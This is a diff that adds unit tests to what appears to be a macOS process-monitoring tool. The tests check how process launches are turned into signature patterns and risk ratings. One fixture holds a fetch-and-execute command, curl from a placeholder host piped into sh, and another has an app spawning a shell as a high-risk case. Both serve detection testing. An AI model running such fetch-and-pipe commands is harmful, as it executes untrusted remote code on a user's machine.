@@ -141,3 +141,35 @@ import Testing
         #expect(!file("/bin/zsh", pid: 17, "r", "\(home)/Projects/a/b/c.txt").signaturePattern.contains("**"))
     }
 }
+
+/// Launches of interpreters and tools name what was run: never "bash → perl" (perl running anything).
+@Suite struct SpecificLaunchPatterns {
+    @Test func interpretersNameTheScriptOrTheCode() {
+        #expect(exec("/usr/bin/perl", pid: 1, ppid: 0, parent: "/bin/bash", args: "perl \(home)/bin/build.pl --fast")
+                .signaturePattern == "/usr/bin/perl ~/bin/build.pl")
+        #expect(exec("/bin/sh", pid: 2, ppid: 0, parent: "/bin/zsh", args: "sh -c 'curl -s https://x.example/p | sh'")
+                .signaturePattern == "/bin/sh -c ‹curl -s https://x.example/p | sh›")
+        #expect(exec("/opt/homebrew/bin/python3.12", pid: 3, ppid: 0, parent: "/bin/zsh", args: "python3.12 -u tools/run.py")
+                .signaturePattern == "/opt/homebrew/bin/python3.12 tools/run.py")
+    }
+
+    @Test func toolsNameTheirArguments() {
+        let ditto = exec("/usr/bin/ditto", pid: 4, ppid: 0, parent: "/bin/bash",
+                         args: "ditto -x -k '\(home)/Downloads/My App.zip' \(home)/Downloads")
+        #expect(ditto.signaturePattern == "/usr/bin/ditto -x -k ~/Downloads/My App.zip ~/Downloads")
+        let a = exec("/usr/bin/curl", pid: 5, ppid: 0, parent: "/bin/bash", args: "curl -s https://a.example/x")
+        let b = exec("/usr/bin/curl", pid: 6, ppid: 0, parent: "/bin/bash", args: "curl -s https://b.example/y")
+        #expect(a.signatureKey != b.signatureKey)                                   // two downloads, two patterns
+    }
+
+    @Test func otherProgramsAndBareShellsStayAsTheyWere() {
+        #expect(exec("/bin/ls", pid: 7, ppid: 0, parent: "/bin/zsh", args: "ls -la").signaturePattern == "/bin/ls")
+        #expect(exec("/bin/zsh", pid: 8, ppid: 0, parent: "/usr/bin/login", args: "-zsh").signaturePattern.hasPrefix("/bin/zsh"))
+        #expect(SignatureBuilder.shellTokens("ditto -x 'a b' c") == ["ditto", "-x", "a b", "c"])
+    }
+
+    @Test func appSpawningAShellIsStillHighRisk() {
+        let e = exec("/bin/sh", pid: 9, ppid: 0, parent: "/Applications/Slack.app/Contents/MacOS/Slack", args: "sh -c 'id'")
+        #expect(e.signatureRisk == .high && e.signaturePattern == "/bin/sh -c ‹id›")
+    }
+}
